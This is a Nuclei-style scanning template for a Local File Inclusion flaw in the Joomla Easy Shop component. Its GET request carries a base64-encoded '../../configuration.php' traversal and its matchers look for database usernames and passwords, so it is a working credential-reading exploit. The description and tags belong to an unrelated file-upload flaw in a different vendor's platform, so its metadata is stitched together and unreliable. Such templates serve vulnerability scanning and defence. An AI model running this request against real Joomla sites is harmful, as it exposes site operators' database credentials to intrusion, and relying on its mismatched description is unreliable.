id: joomla-easyshop-lfi

info:
  name: Joomla! Component Easy Shop 1.2.3 - Local File Inclusion
  author: ritikchaddha
  severity: high
  description: |
    Jiangsu Maiwei Intelligent Technology Co., Ltd. is a software technology service provider focusing on customized development of software products. There is a file upload vulnerability in Jiangsu Maiwei Intelligent Technology Co., Ltd.'s safe production digital management platform. An attacker can use this vulnerability to gain server permissions.
  reference:
    - https://blog.csdn.net/weixin_42628854/article/details/136036109
  metadata:
    verified: true
    max-request: 2
    shodan-query: http.component:"Joomla"
  tags: cnvd,cnvd2023,file-upload

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?option=com_easyshop&task=ajax.loadImage&file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA="

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "<?php", "class JConfig {")'
          - 'contains_any(body, "$user", "$password", "$dbtype")'
          - 'status_code == 200'
        condition: and
